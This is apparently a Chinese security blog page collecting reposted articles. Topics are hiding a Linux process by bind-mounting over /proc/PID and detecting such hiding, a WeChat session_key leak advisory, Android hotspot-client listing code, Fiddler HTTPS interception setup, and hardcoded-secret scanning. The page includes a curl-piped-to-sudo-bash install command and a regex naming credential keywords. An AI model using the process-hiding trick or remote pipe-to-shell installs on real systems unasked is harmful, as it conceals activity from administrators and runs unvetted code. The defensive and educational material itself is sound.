+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先，创建一个空目录（无任何挂载）</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /empty/dir</span><br><span class="line"><span class="comment">#将空目录进行挂载</span></span><br><span class="line">mount -o <span class="built_in">bind</span> /empty/dir/ /proc/1945</span><br></pre></td></tr></table></figure>
+
+<p>然后，我们再来查询看看进程是否隐藏：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@docker]-[~]-<span class="comment">#ps -ef|grep minio</span></span><br><span class="line">root      46358  32804  0 10:54 pts/0    00:00:00 grep --color=auto minio</span><br></pre></td></tr></table></figure>
+
+<p>发现，进程已经被我们隐藏掉了。</p>
+</blockquote>
+<h2><span id="二-隐藏进程侦查">二、隐藏进程侦查</span></h2><h3><span id="21-方式一mounts">2.1 方式一（mounts）</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@docker]-[/proc]-<span class="comment">#cat /proc/mounts </span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/02/Process-Hide/1.png" alt="image"></p>
+</blockquote>
+<h3><span id="22-方式二sysdig">2.2 方式二（sysdig）</span></h3><blockquote>
+<p>下载安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://s3.amazonaws.com/download.draios.com/stable/install-sysdig | sudo bash</span><br><span class="line"></span><br><span class="line">[root@docker]-[~]-<span class="comment">#sysdig -c topprocs_cpu</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/02/Process-Hide/2.png" alt="image"></p>
+</blockquote>
+<h3><span id="23-方式三unhide">2.3 方式三（unhide）</span></h3><blockquote>
+<p>下载安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install unhide</span><br></pre></td></tr></table></figure>
+
+<p>暴力扫描隐藏进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unhide checkbrute</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/02/Process-Hide/3.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Process/" rel="tag">Process</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/02/WeChat-Session-Key/">
+                安全课堂｜关于小程序session_key泄露漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Sep 2, 2023
+    </time>
+    <section class="content">
+        <h1><span id="安全课堂关于小程序session_key泄露漏洞">安全课堂｜关于小程序session_key泄露漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://developers.weixin.qq.com/community/minihome/doc/000806202400280b0edd5866156c01?blockType=99">微信团队</a> 并作补充</p>
+<p>为进一步提升小程序的安全性和用户体验，目前平台对提审的小程序均需进行安全检测，在检测过程中发现仍有许多小程序存在安全漏洞，其中涉及session_key泄露漏洞，希望通过以下相关的漏洞介绍、案例分析和修复建议，开发者能更加了解如何对该漏洞进行防御。</p>
+</blockquote>
+<h2><span id="一-漏洞介绍">一、漏洞介绍</span></h2><blockquote>
+<p>为了保证数据安全，微信会对用户数据进行加密传输处理，所以小程序在获取微信侧提供的用户数据（如手机号）时，就需要进行相应的解密，这就会涉及到session_key，具体流程可参考开放数据校验与解密开发文档。</p>
+<p>session_key指的是会话密钥，可以简单理解为微信开放数据AES加密的密钥，它是微信服务器给开发者服务器颁发的身份凭证，这个数据正常来说是不能通过任何方式泄露出去的。小程序若存在session_key泄露漏洞的情况，则代表微信侧传递的用户数据有被泄露、篡改等风险，开发者应及时发现该漏洞并快速修复相应问题。</p>
+<p><img src="/2023/09/02/WeChat-Session-Key/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="二-漏洞案例">二、漏洞案例</span></h2><blockquote>
+<p>某小程序因为session_key泄露，导致该小程序可以使用任意手机号进行登录，造成了极大的安全风险。</p>
+<p>我们可以很明显地看到，下列请求中的session_key已经被泄露：</p>
+<p><img src="/2023/09/02/WeChat-Session-Key/2.png" alt="image"></p>
+<p>通过获取该session_key，我们可以结合iv解密出密文：</p>
+<p><img src="/2023/09/02/WeChat-Session-Key/3.png" alt="image"></p>
+<p>只需如下脚本即可进行解密，所以攻击者也可利用同样的信息去篡改用户数据，然后加密后返回给服务器，从而达到使用任意手机号进行登录的目的。</p>
+<p><img src="/2023/09/02/WeChat-Session-Key/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="三-漏洞修复">三、漏洞修复</span></h2><blockquote>
+<p>通过上述案例，我们了解到session_key泄露会对小程序造成的危害，而导致session_key泄露的原因则可能有以下两种：</p>
+<p>1.通过auth.code2Session接口获取用户openid时，返回小程序的数据中包含了session_key字段，以泄露的url：&#x2F;api&#x2F;get_openid.php?code&#x3D;xxxx为例，具体的表现如下图所示：</p>
+<p><img src="/2023/09/02/WeChat-Session-Key/5.png" alt="image"></p>
+<p>查看后端get_openid.php的源码，经排查发现$response 变量包含了session_key字段，开发者应去掉变量中的session_key字段，若需获取openid，应只提取该字段返回小程序即可。</p>
+<p><img src="/2023/09/02/WeChat-Session-Key/6.png" alt="image"></p>
+<p>2.在解密开放数据时，使用了错误的方式，以获取手机号接口为例，通过事件回调获取微信服务器返回的加密数据（encryptedData和iv）后，将服务端中的session_key传送至小程序前端，直接在前端进行解密：﻿</p>
+<p><img src="/2023/09/02/WeChat-Session-Key/7.png" alt="image"></p>
+<p>这种方式是绝对不可取的，正确的流程应该是将加密数据（encryptedData和iv）传至服务端后，结合服务端中的session_key进行解密获取手机号，然后返回给小程序。另外，目前平台已对获取手机号接口进行了安全升级，建议开发者使用新版本，以增强小程序的安全性。</p>
+<p>若小程序存在相应的session_key泄露漏洞问题，请开发者尽快自查并修复漏洞：</p>
+<p>请尽快在网络请求中，去除请求和响应中的session_key字段及其对应值，后续也不应该将session_key传到小程序客户端等服务器外的环境，以便消除风险。</p>
+</blockquote>
+<h2><span id="其他常见问题">其他常见问题</span></h2><h3><span id="q1-如何进行相应的修复是需要把session_key字段更换个名字就可以了吗">Q1: 如何进行相应的修复，是需要把session_key字段更换个名字就可以了吗？</span></h3><blockquote>
+<p>A1: 不是，更换字段名无法从根本上消除风险，session_key这个字段及对应值不应该传到小程序客户端等服务器外的环境，需去除请求和响应中的所有相关信息，才可对该漏洞问题进行修复。</p>
+</blockquote>
+<h3><span id="q2-解密开放数据的正确方式是什么">Q2: 解密开放数据的正确方式是什么？</span></h3><blockquote>
+<p>A2: 以获取手机号接口为例，通过事件回调获取微信服务器返回的加密数据（encryptedData和iv），将加密数据传至服务端后，结合服务端中的session_key进行解密获取手机号，然后返回给小程序。而不应将服务端中的session_key传送至小程序前端，直接在前端进行解密。</p>
+</blockquote>
+<h2><span id="相关文章">相关文章</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://developers.weixin.qq.com/community/minihome/doc/0004a84fcb0bb0e89eddbaa5156401?blockType=99">安全课堂｜关于小程序AppSecret密钥泄露漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://developers.weixin.qq.com/community/minihome/doc/00086415470e98a3972e9d90856c01?blockType=99">安全课堂｜关于小程序云AK&#x2F;SK泄露漏洞</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Hard-Coding/" rel="tag">Hard Coding</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WeChat/" rel="tag">WeChat</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/02/Android-WIFI/">
+                Android 开启个人热点时 获取连接人数以及连接上的设备信息
+            </a>
+        </h2>
+    
+    <time>
+        Sep 2, 2023
+    </time>
+    <section class="content">
+        <h1><span id="android-开启个人热点时-获取连接人数以及连接上的设备信息">Android 开启个人热点时 获取连接人数以及连接上的设备信息</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/king4148/article/details/70156760">多看一二</a> 并作补充</p>
+</blockquote>
+<h2><span id="起因">起因</span></h2><blockquote>
+<p>最近在开发过程当中，遇到一个需求 ，开启个人热点后需要知道有多少人连上了这个热点 以及这些设备的信息</p>
+<p>经过一段时间的摸索和反复的查阅资料，有了下面的代码和解决办法：</p>
+<p>首先 连接热点的所有信息都保存在proc&#x2F;net&#x2F;arp下面 用re文件管理器可以查看一下</p>
+<p>会发现 里面有连接的设备的 ip mac地址 等等  </p>
+<p>好了 那么问题就简单了</p>
+<p>直接贴代码：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">ArrayList&lt;ClientScanResult&gt; result = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;/proc/net/arp&quot;</span>));<span class="comment">//读取这个文件</span></span><br><span class="line">    String ss=br.toString();</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        String[] splitted = line.split(<span class="string">&quot; +&quot;</span>);<span class="comment">//将文件里面的字段分割开来</span></span><br><span class="line">        <span class="keyword">if</span> (splitted.length &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="comment">// Basic sanity check</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">mac</span> <span class="operator">=</span> splitted[<span class="number">3</span>];<span class="comment">// 文件中分别是IP address  HW type Flags HW address mask Device </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//然后我们拿取HW address  也就是手机的mac地址进行匹配  如果有 就证明是手机</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mac.matches(<span class="string">&quot;..:..:..:..:..:..&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isReachable</span> <span class="operator">=</span> InetAddress.getByName(splitted[<span class="number">0</span>]).isReachable(reachableTimeout);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!onlyReachables || isReachable) &#123;</span><br><span class="line"></span><br><span class="line">                    result.add(<span class="keyword">new</span> <span class="title class_">ClientScanResult</span>(splitted[<span class="number">0</span>], splitted[<span class="number">3</span>], splitted[<span class="number">5</span>], isReachable));<span class="comment">//最后如果能匹配 那就证明是连接了热点的手机  加到这个集合里 里面有所有需要的信息</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    CandyLog.e(e.getMessage());</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (br != <span class="literal">null</span>) &#123;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        CandyLog.e(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientScanResult</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String IpAddr;</span><br><span class="line">    <span class="keyword">private</span> String HWAddr;</span><br><span class="line">    <span class="keyword">private</span> String Device;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> isReachable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClientScanResult</span><span class="params">(String ipAddr, String hWAddr, String device, <span class="type">boolean</span> isReachable)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.IpAddr = ipAddr;</span><br><span class="line">        <span class="built_in">this</span>.HWAddr = hWAddr;</span><br><span class="line">        <span class="built_in">this</span>.Device = device;</span><br><span class="line">        <span class="built_in">this</span>.isReachable = isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getIpAddr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> IpAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIpAddr</span><span class="params">(String ipAddr)</span> &#123;</span><br><span class="line">        IpAddr = ipAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHWAddr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> HWAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHWAddr</span><span class="params">(String hWAddr)</span> &#123;</span><br><span class="line">        HWAddr = hWAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDevice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Device;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDevice</span><span class="params">(String device)</span> &#123;</span><br><span class="line">        Device = device;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isReachable</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setReachable</span><span class="params">(<span class="type">boolean</span> isReachable)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.isReachable = isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>好了 想要知道连接人数  只要得到集合的size就可以了  又解决一个问题</p>
+<p>关键点在于 热点信息储存在proc&#x2F;net&#x2F;arp 里面  有兴趣的可以了解下proc目录 里面有很多很多信息</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WIFI/" rel="tag">WIFI</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/02/Fiddler-HTTPS/">
+                Fiddler设置解密https的网络数据
+            </a>
+        </h2>
+    
+    <time>
+        Sep 2, 2023
+    </time>
+    <section class="content">
+        <h1><span id="fiddler设置解密https的网络数据">Fiddler设置解密https的网络数据</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38914978/article/details/104801629">Admirer_joker</a> 并作补充</p>
+</blockquote>
+<h2><span id="原理">原理</span></h2><blockquote>
+<p>Fiddler可以通过伪造CA证书来欺骗了浏览器和https服务器。大致原理就是在浏览器面前fiddler伪装成为一个https服务器，而在真正的https服务器面前fiddler又伪装成为浏览器，从而实现解密https数据包的目的；</p>
+</blockquote>
+<h2><span id="步骤">步骤</span></h2><blockquote>
+<p>解密https需要手动开启，步骤如下：</p>
+</blockquote>
+<h3><span id="1-tools-gt-fiddler-options-gt-https">1. Tools –&gt; Fiddler Options –&gt; HTTPS</span></h3><h3><span id="2-打开options-https后如图">2. 打开options-https后，如图：</span></h3><blockquote>
+<p><img src="/2023/09/02/Fiddler-HTTPS/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/09/02/Fiddler-HTTPS/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/09/02/Fiddler-HTTPS/3.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Fiddler/" rel="tag">Fiddler</a><a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/07/24/Hard-Coding/">
+                敏捷代码审计之代码硬编码
+            </a>
+        </h2>
+    
+    <time>
+        Jul 24, 2023
+    </time>
+    <section class="content">
+        <h1><span id="敏捷代码审计之代码硬编码">敏捷代码审计之代码硬编码</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://hksanduo.github.io/2022/09/09/2022-09-09-harder-coding-scan/">Sanduo</a> 并作补充</p>
+</blockquote>
+<h2><span id="介绍">介绍</span></h2><blockquote>
+<p>硬编码（英语：Hard Code或Hard Coding）是指在软件编码过程中，将输出或输入的相关参数（例如：路径、输出的形式或格式）直接以常量的方式撰写在源代码中，而非在执行期间由外界指定的设置、资源、资料或格式做出适当回应。一般被认定是种反模式或不完美的实现，因为软件受到输入资料或输出格式的改变就必须修改源代码，对客户而言，改变源代码之外的小设置也许还比较容易。但硬编码的状况也并非完全只有缺陷，因某些封装需要或软件本身的保护措施，有时是必要的手段。除此之外，有时候因应某些特殊的需求，制作出简单的应用程序，应用程序可能只会执行一次或者有限的几次，或者永远只应付某种单一需求。<br>所谓硬编码，就是把一个本来应该（可以）写到配置信息中的信息直接在程序代码中写死了。密钥硬编码在代码中，而根据密钥的用途不同，这导致了不同的安全风险，有的导致加密数据被破解，数据不再保密，有的导致和服务器通信的加签被破解，引发各种血案。</p>
+</blockquote>
+<h2><span id="硬编码检测方法">硬编码检测方法</span></h2><blockquote>
+<p>方法论主要参考：密码密钥硬编码检查，参考链接详见文章末尾。</p>
+</blockquote>
+<h3><span id="鉴别密码密钥方法">鉴别密码密钥方法</span></h3><h4><span id="香农熵shannon-entropy">香农熵(Shannon entropy)</span></h4><blockquote>
+<p>密钥的长度决定了密钥空间(keyspace），通常以位为单位。密钥空间越大，密钥被攻破的难度就越大。<br>密钥是由密钥空间的随机值构成。对于任意一个随机变量 X，它的熵定义如下：</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Hard-Coding/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>变量的不确定性越大，熵也就越大，把它搞清楚所需要的信息量也就越大。</p>
+<ul>
+<li>P(x_i)P(xi) : 指的是单个样本变量所属的变量种类的个数占据所有变量个数的比例。同等长度的字符串，通常密钥的熵值更高</li>
+<li>密钥为避免彩虹攻击，在取值上更加的离散，会尽量采用不重复的字符。就像我们为了增加密码的复杂性，要求长度不小于8，必须包含大小写、特殊字符、以及数字一样的道理。所以密钥的熵值会比一般的文本要高的多。我们就是利用这点来识别字符串是否是密钥。</li>
+</ul>
+</blockquote>
+<h3><span id="工具的检查逻辑">工具的检查逻辑</span></h3><blockquote>
+<p>对于密码密钥的硬编码检查可以采用静态分析工具来完成。工具的检查过程通常包含四个过程：输入文件准备、检查、过滤和报告输出。</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Hard-Coding/2.png" alt="image"></p>
+</blockquote>
+<h4><span id="输入文件分类">输入文件分类</span></h4><blockquote>
+<p>我们需要检查的文本文件进行分类，通常包括以下几种类型：</p>
+<ul>
+<li>程序语言：C、C++、Java、Python、Go、Js等；</li>
+<li>有统一格式的文件：属性文件、yaml、csv、json、xml等；</li>
+<li>文本文件：没有固定格式的文本文件。<br>分类的目的是为了更好的识别文件中的字符串常量，充分利用字符串常量的上下文关联，以便在分析中最大程度的减少误报。</li>
+</ul>
+</blockquote>
+<h4><span id="输入文件转换">输入文件转换</span></h4><blockquote>
+<ul>
+<li>程序语言：通过各语言的语法解析器，解析成抽象语法树，提取语法树中的等于字符串的常量，以及对应的变量名；</li>
+<li>有统一格式的文件：照格式转换成变量名和字符串常量值；</li>
+<li>文本文件：采用token的方式分割成一个个的token，变成一个各的字符串常量。</li>
+</ul>
+</blockquote>
+<h4><span id="密码密钥检查">密码密钥检查</span></h4><blockquote>
+<p>在我们得到大量的变量名和字符串常量后，主要通过正则表达式匹配的方式完成目标的筛选。我们收集的密钥格式包括国内国外主流平台、SDK等相关系统的密钥配置参数名称，可以根据客户的实际情况手动增加和优化规则，进而提高检测的速度和效率。<br>由于检查密码密钥的种类和类型不同，可以通过配置文件来提高检查能力的可扩展性。<br>检查配置选项主要包括以下内容：</p>
+</blockquote>
+<p>|信息	|描述	|<br>|检查类型	|可分为：变量名、字符串常量、或两个都检查	|<br>|密码密钥的类型	|用于区分不同类型的密码密钥；同时用于告警时区分具体检测到的密码密钥类型	|<br>|正则表达式	|主要设定匹配的长度，每个字符的可选类型	|<br>|熵值的阈值	|用于精确的识别密码密钥的类型，降低误报	|</p>
+<blockquote>
+<p>例如：<br>检查硬编码的口令：检查变量名中包含：password、passwd、pwd的变量，且变量等于字符串常量；正则表达式可以设置成为：”.*(password|passwd|pwd)$”。<br>检查GitHub的个人凭证：检查字符串常量；这个凭证是以”ghp_”开头的，跟随长度为36的字符串，且每个字符可以为数字和字母；正则表达式可以设置成为：“ghp_[0-9a-zA-Z]{36}”。</p>
+</blockquote>
+<h4><span id="密码密钥过滤">密码密钥过滤</span></h4><blockquote>
+<p>静态分析能很大程度上减少了人工审核的工作量，但由于检查模式的不确定性，也会带来不少的误报。误报会给用户在审核过程中带来很大的负面情绪，从而不愿继续使用工具。为了进一步降低误报，我们可以通过下面的方式来降低误报：</p>
+<ul>
+<li>密码密钥熵值的计算<br>前面讨论过密码密钥的特点，可以通过检测密码密钥的信息熵的方式来降低误报。有些密码密钥设定了最低的阈值，但还是有很多密码密钥并未给出具体的阈值，这个就需要通过经验积累来设定，目前业界也有通过机器学习来完善这个阈值的设定。</li>
+<li>污点分析<br>在代码中，对于口令的变量的取名上，很多并不会遵守可读性和可维护性来设定变量名，通过前面正则表达式的方式来查找硬编码密码的方式，会造成很多的漏报。这里还可以通过污点分析的方法，来推导出密码是否采用了硬编码。例如检查jdbc连接的密码参数，查看该参数是否为字符串常量。</li>
+</ul>
+</blockquote>
+<h4><span id="报告输出">报告输出</span></h4><blockquote>
+<p>将经过过滤后的结果，输出告警，给出可能泄露的文件名和变量或可能为密码密钥的常量字符串位置，便于人工的排查。</p>
+</blockquote>
+<h2><span id="硬编码检测实战">硬编码检测实战</span></h2><blockquote>
+<p>对于审计人员或者安全管理人员并不需要关注密钥检查的算法，通常只需要选用合适的流程，匹配恰当的工具，迅速准确的定位硬编码即可。</p>
+</blockquote>
+<h3><span id="检查的流程">检查的流程</span></h3><blockquote>
+<p>信息收集：此阶段中，审计人员进行必要的信息收集，包括本次审计要求、稳定版本的源代码。<br>工具审计：确定工具审计的标准和各项配置参数，使用Fortify、gitleaks等工具检测目标源代码，对工具检测的结果进行人工核查，筛选，分析，汇总。<br>人工审计：对客户要求人工审计的重点代码采用人工分析的方法，对源代码中的硬编码进行审计。<br>综合汇总：将工具审计和人工审计的结果进行对比汇总<br>输出报告：此阶段中，审计人员根据测试的结果编写直观的硬编码审计服务报告。<br>源代码硬编码审计要求工作人员有丰富的经验及新颖的思路，同时也是一项比较耗费时间和资源的工作，从效率考虑，一般选择性的抽取部分重要环节的代码进行人工审计。</p>
+</blockquote>
+<h3><span id="开源检查工具">开源检查工具</span></h3><h4><span id="secretscanner">SecretScanner</span></h4><blockquote>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/deepfence/SecretScanner">https://github.com/deepfence/SecretScanner</a><br>SecretScanner可以扫描主机上的容器镜像或本地目录，主要通过正则匹配，扫描效率较高，不仅支持代码而且支持容器扫描，并将结果输出到JSON文件，其中会包含SecretScanner找到的所有敏感数据的详细信息。<br>SecretScanner方便安全人员在主机上收集敏感数据，如果需要审计特定类型代码或者增加新的硬编码检测点，需要手动修改规则，默认配置文件位于项目中的config.yaml，可以根据实际情况自行修改。</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Hard-Coding/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>不足：规则数量一般</p>
+</blockquote>
+<h4><span id="gitleaks">gitleaks</span></h4><blockquote>
+<p>Gitleaks为你提供了一种方法来扫描你的git存储库，以查找这些不需要的数据，这些数据应该是私有的，扫描可以自动化，以完全适合CI&#x2F;CD工作流程，以便在密码识别更深入到代码库之前进行识别。<br>gitleaks比较有趣的有以下几点：</p>
+<ul>
+<li>支持私有存储库扫描以及需要基于密钥的身份验证的存储库。</li>
+<li>支持Gitlab批量组织和存储库所有者（用户）存储库扫描，并提取请求扫描以在常见CI工作流中使用。</li>
+<li>支持Pre-Commit，方便研发人员在提交之前进行硬编码检测，防止敏感信息提交。</li>
+<li>支持使用git log命令验证由gitleaks找到的发现</li>
+</ul>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Hard-Coding/4.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>不足：对普通用户友好程度一般，对于pre-commit需要手动配置，并且在大文件扫描效率较低，官方已移除多线程配置参数，使用默认线程数进行扫描，如果在使用过程中感觉缓慢，可自行设定编译。同样规则数量一般，可以根据实际情况添加。</p>
+</blockquote>
+<h4><span id="sasts">SASTs</span></h4><blockquote>
+<p>各种SAST工具都可以检测硬编码，但是受限于使用场景，只能检测较少的硬编码场景，比如password，key等，对于特定的硬编码需要手动增加规则，规则友好性一般。</p>
+</blockquote>
+<h3><span id="硬编码检测规则">硬编码检测规则</span></h3><blockquote>
+<p>无论gitleaks还是secretScanner，均使用正则匹配相关硬编码，敏感信息，我这里整理出部分敏感信息参数，供大家参考，至于规则，按照要求，自行补充即可，比较简单，这里就不单独描述了</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regex: <span class="string">&#x27;(?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc 